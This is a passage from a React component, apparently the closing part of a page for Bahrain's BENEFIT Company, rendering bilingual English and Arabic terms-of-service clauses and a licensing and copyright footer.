                          <span className="text_EN" style={{ display: 'inline' }}>
                            This site is not directed to , or intended for
                            distribution to or use by , any person or entity who
                            is a citizen or resident of or located in any
                            jurisdiction wherever such distribution , publication
                            availability or use would be contrary to law or
                            regulation or which would subject BENEFIT to any
                            registration or licensing requirement within such
                            jurisdiction.
                          </span>
                          <span className="text_AR" style={{ display: 'none' }}>
                            هذا الموقع غير موجه ولا يستهدف توجيهه أو استخدامه من
                            قبل أي شخص أو كيان يكون مواطناً أو مقيماً أو يقع ضمن
                            أي سلطات قضائية مخالفة للقانون أو أي أحكام تنظيمية أو
                            قد تفرض على شركة بنفت الوفاء بمتطلبات التسجيل أو
                            الترخيص ضمن جهة هذه السلطة القضائية.
                          </span>{' '}
                        </li>
                        <li>
                          <span className="text_EN" style={{ display: 'inline' }}>
                            BENEFIT reserves the right to amend these Terms of
                            Service at any time and from time to time and you must
                            read these Terms of Service at regular intervals to
                            ensure that you are familiar with their content.{' '}
                          </span>
                          <span className="text_AR" style={{ display: 'none' }}>
                            تحتفظ بنفت بالحق في تعديل شروط الخدمة في أي وقت ومن
                            وقت لآخر. ويجب عليك قراءة شروط الخدمة بشكل منتظم لضمان
                            الإطلاع على محتواها.
                          </span>
                        </li>
                        <li>
                          <span className="text_EN" style={{ display: 'inline' }}>
                            BENEFIT owns all intellectual property on this site
                            and all rights are reserved.
                          </span>
                          <span className="text_AR" style={{ display: 'none' }}>
                            تملك بنفت كافة الحقوق الفكرية عن هذا الموقع وجميع
                            الحقوق محفوظة.
                          </span>
                        </li>
                        <li>
                          <span className="text_EN" style={{ display: 'inline' }}>
                            These Terms of Service are governed by and will be
                            construed in accordance with Bahrain Law. The User
                            hereby submits to the non-exclusive jurisdiction of
                            the courts of Bahrain.
                          </span>
                          <span className="text_AR" style={{ display: 'none' }}>
                            تخضع شروط الخدمة ويتم تفسيرها وفق قانون البحرين.
                            ويوافق المستخدم على الخضوع للسلطات القضائية غير
                            الحصرية لمحاكم البحرين.
                          </span>
                        </li>
                      </ol>
                    </div>
                  </li>
                </ul>
                {/* </div> */}
                <br />
                {/* <div class="container" align="left"> */}
                <table>
                  <tbody>
                    <tr>
                      <td>
                        <img src="/logo.webp" />
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          Powered By The BENEFIT Company.
                          <br />
                          Copyright © 2020-2025 The BENEFIT Company. All Rights
                          Reserved.
                          <br />
                          Licensed by Central Bank of Bahrain as Ancillary Service
                          Provider.
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          يدار الموقع من قبل شركة بنفت.
                          <br />
                          حقوق التأليف © 2020-2025 لشركة بنفت. جميع الحقوق محفوظة.
                          <br />
                          مرخص من قبل مصرف البحرين المركزي لتقديم الخدمات المساعدة
                          للقطاع المالي.
                        </span>
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          </div>
          </div>

      </form>
     
      
    </div>
    
  )
}
